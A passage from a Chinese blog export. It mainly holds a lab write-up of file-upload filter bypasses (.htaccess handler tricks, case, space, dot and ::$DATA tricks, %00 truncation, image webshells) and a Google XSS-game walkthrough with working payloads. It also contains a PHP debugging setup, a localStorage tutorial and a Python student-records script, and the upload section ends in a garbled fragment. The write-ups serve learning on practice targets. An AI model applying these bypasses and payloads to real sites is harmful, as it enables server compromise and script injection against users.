trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 分析 黑名单里的文件后缀名增多了 绕过 上传.hataccess文件 .htaccess文件 .htaccess是一个纯文本文件，它里面存放着对当前目录配置相关的指令。 主要作用：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。 作用范围：当前目录。 httpd.confhttpd.conf是apache的全局配置文件 在httpd.conf中加入下面命令 12345# 将phtml当作php文件解析AddType application/x-httpd-php .php .phtml# 将所有文件都当作php文件解析SetHandler application/x-httpd-php 这两条命令对应到.htaccess中的话，可以像下面这样写 12345# 将所有文件当作php解析AddType application/x-httpd-php # 将jpg文件当作php文件解析AddType application/x-httpd-php .jpg 绕过了解了.htaccess文件后，我们来绕过，创建一个文本，在文本中写入 1AddType application/x-httpd-php 上传成功 然后将phpinfo.php修改后缀名为：.jpg上传，成功执行 PASS-05代码 12345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 分析： 过滤了.htaccess，第四关的方法不能用 但是看了一下黑名单，发现没有PhP大小写的过滤 绕过：上传phpinfo.PhP PASS -06代码 12345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); //获取后缀名 $file_ext = strtolower($file_ext); //将后缀名转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 分析 这段代码与上一关相比，少了一个后缀名首尾去空的环节，猜测是后缀名加空绕过 绕过 上传phpinfo.php ，然后抓包加空格 PASS-0712345678910$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;);//获取后缀名 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//将::$DATA替换成空，去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 分析 少了deldot函数删除文件名末尾的点 此处关注一个函数：strrchr() 查找指定字符在字符串中的最后一次出现，即假如我上传的文件名为test.php.的时候，它获取的是空值 在Windows中，文件系统会自动忽略末尾的.，但是在linux中则不行 绕过 上传文件名为test.php. PASS-08代码 123456$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 代码删除了对::$DATA的过滤，了解了一下::$DATA，具体见这篇文章https://blog.csdn.net/vivilorne/article/details/3841509 绕过 抓包将文件名修改为phpinfo.php::$data PASS - 09代码 1234567$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 绕过： 利用apache的解析漏洞 当apache在解析一个文件时，从右往左依次寻找.最后出现的位置，然后截取后面的后缀名进行对应文件解析 如此后缀名不能解析，则会依次向前寻找，直到找到可以解析的文件名后缀 上传文件名为：phpinfo.php.xxx PASS - 10代码 123456$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); //去除首尾空白字符 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//若存在黑名单的php中的字符串，则替换成空 $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; php 分析：见注释 绕过：后缀名双写绕过 PASS-11代码 1234567891011121314$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); //获取文件后缀名 if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; 这次使用的是白名单防御，但是抓包发现可以控制路径 绕过 00%截断 看到上传路径后面虽然有jpg，但是前面有00截断，系统会认为这是一个结束字符 PASS - 12代码 12345$ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 与上一关不同的是这次是post修改文件路径 00截断，不过这次实在hex中添加，因为POST不会对%00进行解码 PASS - 13代码 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; 分析：对文件头进行了校验 绕过 上传图片马 首先制作图片马 1copy 1.jpg/a + phpinfo.php/b info.png 上传后进行包含 PASS - 14代码 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); // $ext = image_type_to_extension($info[2]); // 取得图像类型的文件后缀 if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 分析： 相比上一关，对文件的类型进行了判断，getimagesize()用于获取上传的文件类型 绕过 同样上传图片马 PASS - 15123456789101112131415161718function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; 用exif_imagetype对上传的文件类型进行了判断 上传图片马绕过 PASS - 16ping = str1(IP(dst=’’,ttl=1,id=175)/ICMP(id=188,seq=1)/b’welcome ‘) ping.getlayer(ICMP).fields //截取ICMP包里的值 ping.getlayer(ICMP).fields .[‘值’]//截取ICMP包里的值 https://www.freebuf.com/articles/web/179954.html","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Windows下vscode配置PHP动态调试环境","slug":"windows下vscode配置php动态调试","date":"2019-06-19T16:00:00.000Z","updated":"2021-10-22T08:31:39.792Z","comments":true,"path":"2019/06/20/windows下vscode配置php动态调试/","link":"","permalink":"http://example.com/2019/06/20/windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEphp%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","excerpt":"所需网址：https://xdebug.org/wizard","text":"所需网址：https://xdebug.org/wizard 获取xdebug文件打开上述网址，将自己环境下phpinfo()内容全部复制到方框中，然后点击下面的分析按钮： 分析完成后，页面会出现这段文字 配置php.ini根据步骤下载文件，并将他放在指定的路径中后，打开当前php版本的php.ini，增加下面的内容： 123 xdebug.remote_enable = True xdebug.remote_autostart = Truezend_extension = E:\\phpstudy\\PHPTutorial\\php\\php-7.2.1-nts\\ext\\php_xdebug-2.9.6-7.2-vc15-nts.dll 配置vscode打开vscode，安装PHP debug插件 ctrl+, 搜索设置：php.validate.executablePath，点击edit 将本机环境的php执行exe路径填入文件中： 测试 点击vscode的debuger按钮，进入后 open a folder后，界面会改变： 点击后，编辑launch.json，选择PHP： vscode会自动创建拥有如下内容的json文件： 12345678910111213141516171819202122&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Listen for XDebug&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;port&quot;: 9000 &#125;, &#123; &quot;name&quot;: &quot;Launch currently open script&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;port&quot;: 9000 &#125; ]&#125; 然后在run那里点击listen for xdebuger，再浏览器访问想要调试的文件就可以看到相应的调试信息了 总结 改文件一定要备份。。说多了都是泪啊","categories":[],"tags":[{"name":"搭建环境","slug":"搭建环境","permalink":"http://example.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"}]},{"title":"Google-XSS-game","slug":"google-xss","date":"2019-06-16T16:00:00.000Z","updated":"2021-10-22T08:30:40.730Z","comments":true,"path":"2019/06/17/google-xss/","link":"","permalink":"http://example.com/2019/06/17/google-xss/","excerpt":"地址：https://xss-game.appspot.com/level2","text":"地址：https://xss-game.appspot.com/level2 011&lt;script&gt;alert(1)&lt;/script&gt; 021&lt;img src=x onclick=alert(1)&gt; 03代码 1234567891011121314151617181920212223242526272829303132function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27; /&gt;&quot;; $(&#x27;#tabContent&#x27;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(&#x27;.tab&#x27;); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123; tabs[i].className = &quot;tab active&quot;; &#125; else &#123; tabs[i].className = &quot;tab&quot;; &#125; &#125; // Tell parent we&#x27;ve changed the tab top.postMessage(self.location.toString(), &quot;*&quot;);&#125;window.onload = function() &#123; chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;);&#125;// Extra code so that we can communicate with the parent pagewindow.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; chooseTab(unescape(self.location.hash.substr(1))); &#125;&#125;, false); html中关键点 1&lt;img src=&quot;/static/level3/cloud3.jpg&quot;&gt; 分析 self.location.hash ：获取URL#号后面的内容 unescape()：不用url解码 chooseTab()：将#后面输入的图片编码加入img标签中 清晰了利用点，就是#后面的内容会被拼接到html中 1https://xss-game.appspot.com/level3/frame#3&#x27; onclick=&#x27;alert(1)&#x27;; 04输入的东西会拼接到这里 payload 1&#x27;);alert(1);var x=(&#x27; 05next可控 12在url上输入：next=javascript:alert(1) 06url里#后面的内容会拼接到script标签的src中，但是过滤了http，而且必须使用https协议 大小写绕过 一种解法远程加载js代码 googleAPI 1htTps://www.google.com/jsapi?callback=alert 第二种解法：data:text,alert(1)","categories":[],"tags":[]},{"title":"JavaScript实现web浏览器本地存储","slug":"JavaScript本地存储","date":"2018-12-17T16:00:00.000Z","updated":"2021-10-22T08:30:46.661Z","comments":true,"path":"2018/12/18/JavaScript本地存储/","link":"","permalink":"http://example.com/2018/12/18/JavaScript%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/","excerpt":"山山师傅出的第一个小任务，用JavaScript实现web浏览器的本地存储：模拟百度搜索历史记录，将搜索过的内容用本地存储保存并显示出来。这是一篇小白水文。","text":"山山师傅出的第一个小任务，用JavaScript实现web浏览器的本地存储：模拟百度搜索历史记录，将搜索过的内容用本地存储保存并显示出来。这是一篇小白水文。 localstoragelocalstorage的主要函数有 localstorage.setItem(‘属性名’,’属性值’) : 存入lo localstorage.getItem(‘属性名’)：读取 localstorage.clear()：删除 本次存入的数据使用数组方式存入，但是localstorage的存储不支持数组类型，所以要用到JSON的两个函数JSON.stringify()和JSON.parse()，在存数据时将数组序列化成字符串，取出数据时将数据序列化成对象，然后再将对象转化为数组，便于比较和去重。下面两张图来展现一下这几个函数的用法 PS：此处插播一个遇到的小小问题，就是之前测试时存入数据如果没有用JSON.stringify()将数据转换成相应的JSON 格式的话，那后面如果想用JSON.parse()读取数据是会报错的，因为存入的数据不是JSON格式的，所以解析的时候会报错。 JS代码存储123456789101112131415161718192021222324252627282930313233343536373839404142function saveHistory()&#123; mySearch = document.getElementById(&#x27;search_content&#x27;).value; var searchs = []; var storagesearchs = JSON.parse(localStorage.getItem(&#x27;searchs&#x27;)); for (let i in storagesearchs)&#123; searchs.push(storagesearchs[i]); &#125; if (searchs === undefined || searchs.length == 0)&#123; searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; else&#123; flag = 1; if (searchs.length &lt;= 8)&#123; //去重 for(let i in searchs)&#123; if(searchs[i] === mySearch)&#123; flag = 0; &#125; &#125; if(flag)&#123; if(searchs.length == 8)&#123; searchs.splice(0,1); searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; else&#123; searchs.push(mySearch); localStorage.setItem(&#x27;searchs&#x27;,JSON.stringify(searchs)); &#125; &#125; &#125; &#125; location.reload();//函数执行后刷新一次页面&#125; 取出12345678910111213141516171819function showHistory() &#123;// alert(&#x27;show&#x27;); var searchs = []; var storagesearchs = JSON.parse(localStorage.getItem(&#x27;searchs&#x27;)); for (let i in storagesearchs)&#123; searchs.push(storagesearchs[i]); &#125; var len = searchs.length; var ul = document.getElementById(&#x27;search_list&#x27;); for (var i=0; i&lt;len; i++)&#123; var div = document.createElement(&#x27;div&#x27;); var li = document.createElement(&#x27;li&#x27;);//创建一个li元素 li.innerHTML = searchs[i];//将搜索记录写入li中 ul.appendChild(li)//在ul标签下追加li元素 &#125; &#125; html代码123456789101112131415161718192021222324252627282930&lt;!DOCTYPE&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;百度搜索&lt;/title&gt; &lt;link href=&quot;https://fonts.googleapis.com/css?family=PT+Sans&quot; rel=&quot;stylesheet&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/style.css&quot;&gt; &lt;script src=&quot;scripts/main.js&quot; async&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;searching&quot;&gt; &lt;span&gt; &lt;input type=&quot;text&quot; name = &quot;search&quot; id = &quot;search_content&quot; autocomplete=&quot;off&quot; placeholder=&quot;请输入搜索内容·······&quot;&gt; &lt;ul id=&quot;search_list&quot;&gt; &lt;/ul&gt; &lt;/span&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot; id = &#x27;clicking&#x27;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 小结这次的task1学到了很多东西，localstorage，对js函数也有了更深的认识，还有html，css也学到了很多，开心！！重拾代码乐趣！！","categories":[],"tags":[]},{"title":"学生信息管理系统 - python","slug":"student- manage","date":"2018-06-29T16:00:00.000Z","updated":"2021-10-22T08:31:22.564Z","comments":true,"path":"2018/06/30/student- manage/","link":"","permalink":"http://example.com/2018/06/30/student-%20manage/","excerpt":"最近学习python，就写了一个学生管理系统。","text":"最近学习python，就写了一个学生管理系统。 介绍主要功能： 添加信息 修改信息 删除信息 查找 显示所有 数据存取方式：使用json文件存取 环境：Windows python3 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import jsonstuinfos = []def printMenu(): print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27;\\n&#x27;) print(&#x27; &#x27;*25 + &#x27;1.添加学生信息&#x27;) print(&#x27; &#x27;*25 + &#x27;2.修改学生信息&#x27;) print(&#x27; &#x27;*25 + &#x27;3.删除学生信息&#x27;) print(&#x27; &#x27;*25 + &#x27;4.查找学生信息&#x27;) print(&#x27; &#x27;*25 + &#x27;5.显示所有学生信息&#x27;) print(&#x27; &#x27;*25 + &#x27;0.退出系统&#x27;) print(&#x27;\\n&#x27;) print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27;\\n&#x27;)def addStuinfo(): print(&#x27; &#x27;*20+&#x27;=&#x27;*40) newName = input(&#x27; &#x27;*20+&#x27;请输入学生姓名：&#x27;) newSex = input(&#x27; &#x27;*20+&#x27;请输入学生性别：&#x27;) newPhone = input(&#x27; &#x27;*20+&#x27;请输入学生手机号码：&#x27;) print(&#x27; &#x27;*20+&#x27;=&#x27;*40) stuinfo = &#123;&#125; #声明一个字典来存放新学生的信息 stuinfo[&#x27;name&#x27;] = newName stuinfo[&#x27;sex&#x27;] = newSex stuinfo[&#x27;phone&#x27;] = newPhone #stuinfos.append(stuinfo) save_newData(stuinfo)def modifyStuinfo(): number = int(input(&#x27; &#x27;*20+&#x27;请输入要修改的学生序号：&#x27;)) modify_key = int(input(&#x27; &#x27;*20+&#x27;请输入想修改的信息（1.姓名 2.性别 3.手机号码）&#x27;)) if modify_key == 1: newName = input(&#x27; &#x27;*20+&#x27;请输入修改的姓名：&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;name&#x27;] = newName save_Data(stuinfos) elif modify_key == 2: newSex = input(&#x27; &#x27;*20+&#x27;请输入修改的性别（男/女）：&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;sex&#x27;] = newSex save_Data(stuinfos) elif modify_key == 3: newPhone = input(&#x27; &#x27;*20+&#x27;请输入修改的手机号码：&#x27;) stuinfos = load_data() stuinfos[number-1][&#x27;phone&#x27;] = newPhone save_Data(stuinfos) #showStuinfos()def deleteStuinfos(): number = int(input(&#x27; &#x27;*20+&#x27;请输入想要删除的学生序号：&#x27;)) stuinfos = load_data() del stuinfos[number-1] save_Data(stuinfos) showStuinfos()def findStuinfo(): stuinfos = load_data() lenth = len(stuinfos) find_key = int(input(&#x27; &#x27;*20+&#x27;选择查找方式序号（1.序号查找(1-%d) 2.姓名查找）：&#x27;%lenth)) flag = 0 if find_key == 1: number = int(input(&#x27; &#x27;*20+&#x27;请输入想要查找的序号&#x27;)) if number &gt; lenth: print(&#x27; &#x27;*20+&#x27;Error,the number is big than the total!&#x27;) else: print(&#x27; &#x27;*20+&#x27;序号 姓名 性别 电话号码&#x27;) print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(number,stuinfos[number-1][&#x27;name&#x27;],stuinfos[number-1][&#x27;sex&#x27;],stuinfos[number-1][&#x27;phone&#x27;])) else : find_name = input(&#x27; &#x27;*20+&#x27;请输入需要查找的姓名&#x27;) i = 1 for stuinfo in stuinfos: if stuinfo[&#x27;name&#x27;] == find_name: flag = 1 print(&#x27; &#x27;*20+&#x27;序号 姓名 性别 电话号码&#x27;) print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(i,stuinfo[&#x27;name&#x27;],stuinfo[&#x27;sex&#x27;],stuinfo[&#x27;phone&#x27;])) break i += 1 if flag == 0: print(&#x27; &#x27;*20+&#x27;Not Found&#x27;)def showStuinfos(): i = 1 stuinfos = load_data() print(&#x27; &#x27;*20+&#x27;=&#x27;*40) print(&#x27; &#x27;*20+&#x27;序号 姓名 性别 电话号码&#x27;) for stuinfo in stuinfos: print(&#x27; &#x27;*20+&#x27;%d %s %s %s&#x27;%(i,stuinfo[&#x27;name&#x27;],stuinfo[&#x27;sex&#x27;],stuinfo[&#x27;phone&#x27;])) i += 1 print(&#x27; &#x27;*20+&#x27;=&#x27;*40)def save_Data(dicts): with open(&#x27;test.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fw: for dict in dicts: json.dump(dict,fw,ensure_ascii=False) fw.write(&#x27;\\n&#x27;) fw.close()def save_newData(dict): with open(&#x27;test.json&#x27;,&#x27;a&#x27;,encoding=&#x27;utf-8&#x27;) as fwr: json.dump(dict,fwr,ensure_ascii=False) fwr.write(&#x27;\\n&#x27;) fwr.close()def load_data(): data = [] with open(&quot;test.json&quot;, &quot;r&quot;,encoding = &#x27;utf-8&#x27;) as fr: for line in fr: dic = json.loads(line) data.append(dic) fr.close() return datadef main(): while 1: printMenu() key = int(input(&#x27; &#x27;*20+&#x27;请输入需要进行的操作：&#x27;)) if key == 1: addStuinfo() elif key == 2: modifyStuinfo() elif key == 3: deleteStuinfos() elif key == 4: findStuinfo() elif key == 5: showStuinfos() elif key == 0: 